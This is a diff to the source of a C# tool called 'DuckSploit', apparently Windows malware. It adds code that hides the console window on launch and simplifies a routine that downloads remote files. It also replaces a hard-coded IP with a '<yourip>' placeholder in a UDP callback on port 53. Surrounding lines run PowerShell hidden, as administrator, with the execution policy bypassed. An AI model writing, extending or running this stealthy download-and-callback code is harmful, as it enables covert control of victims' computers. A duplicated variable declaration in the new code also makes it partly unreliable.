@@ -16,6 +16,7 @@ using System.Windows;
 using System.Windows.Forms;
 using System.Reflection;
 
+
 namespace DuckSploit
 {
 	public class Program
@@ -24,49 +25,12 @@ namespace DuckSploit
 		{
 			string tempdir = Path.GetTempPath();
 			
-			execute_cmd("if exist " + tempdir + "\\download.ps1 (del " + tempdir + "\\download.ps1)");			
-			
-			outPath = outPath.Replace("\\", "/");
-			url = '"' + url + '"';
-			
-			outPath = '"' + outPath + '"';
-			
-			string str = "(New-Object System.Net.WebClient).DownloadFile(" + url + ", " + outPath + ")";
-			
-			outPath = tempdir + "\\download.ps1";
-			
-            // open or create file
-            FileStream streamfile = new FileStream(outPath, FileMode.OpenOrCreate, FileAccess.Write);
-            // create stream writer
-            StreamWriter streamwrite = new StreamWriter(streamfile);
-            // add some lines
-			
-			outPath = '"' + tempdir + "\\download.ps1" + '"';
+			ServicePointManager.Expect100Continue = true;
+			ServicePointManager.SecurityProtocol = (SecurityProtocolType)(0xc00);
 			
 			
-			// string powershelldownloadtxt = "" + url +"\  "
-            streamwrite.WriteLine(str);
-            // clear streamwrite data
-            streamwrite.Flush();
-            // close stream writer
-            streamwrite.Close();
-            // close stream file
-            streamfile.Close();
-			
-
-			// string error = "";
-			// int exitCode = 0;
-			string output = "";
-			
-			ProcessStartInfo processInfo;
-			Process process;
-			processInfo = new ProcessStartInfo("cmd.exe", "/c powershell " + tempdir + "\\download.ps1");
-			processInfo.CreateNoWindow = true;
-			processInfo.UseShellExecute = false;
-			processInfo.RedirectStandardOutput = true;
-			process = Process.Start(processInfo);
-			process.WaitForExit();
-			output = process.StandardOutput.ReadToEnd();
+			string tempdir = Path.GetTempPath();
+			new WebClient().DownloadFile(url, outPath);
 			
 		}
 		public static void write_txt_to_file(string path, string str)
@@ -243,8 +207,19 @@ namespace DuckSploit
 				return false;
 			}
 		}
+		[DllImport("kernel32.dll")]
+		static extern IntPtr GetConsoleWindow();
+		[DllImport("user32.dll")]
+		static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+		const int SW_HIDE = 0;
+		const int SW_SHOW = 5;
 		public static void Main(string[] args)
 		{
+			Console.SetWindowSize(1, 1);
+			var handle = GetConsoleWindow();
+			ShowWindow(handle, SW_HIDE);
+			
+			
 			string tempdir = Path.GetTempPath();  
 			
 			execute_cmd_asadmin("powershell.exe -WindowStyle hidden Set-ExecutionPolicy bypass -Force");
@@ -262,7 +237,7 @@ namespace DuckSploit
 
 			try{
 				tempdir = Path.GetTempPath(); 
-				udpClient.Connect("192.168.1.46", 53);
+				udpClient.Connect("<yourip>", 53);
 
 				Byte[] sendBytes = Encoding.ASCII.GetBytes("Connected!");
 
